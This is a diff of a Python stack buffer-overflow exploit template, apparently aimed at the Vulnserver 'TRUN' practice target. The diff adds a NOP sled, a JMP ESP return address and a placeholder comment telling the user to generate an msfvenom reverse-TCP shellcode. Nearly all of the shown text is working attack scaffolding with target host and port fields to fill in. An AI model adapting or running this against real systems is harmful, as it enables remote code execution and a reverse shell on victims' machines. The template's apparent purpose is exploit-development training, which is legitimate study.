@@ -7,14 +7,14 @@
 
 import sys, socket
 
-overflow = ()
-
+overflow = ("") #msfvenom generate hex payload for reverse tcp connection. Make sure to scan for bad chars!!!
 SIZE = 200 #change this (size of buffer)
 RHOST = '127.0.0.1' #change this
 RPORT = 80 #change this
-CMD = 'TRUN /.:/' #change this ()
+CMD = 'TRUN /.:/' #change this
 
-shellcode = "A" * SIZE + "\xad\x11\x58\x62" + overflow 
+shellcode = "A" * SIZE + "\xad\x11\x58\x62" + "\x90" * 8  + overflow
+#\x90 - padding NOP command
 #\xad\x11\x58\x62 - x86 memory pointer to JMP ESP instruction 
 
 try:
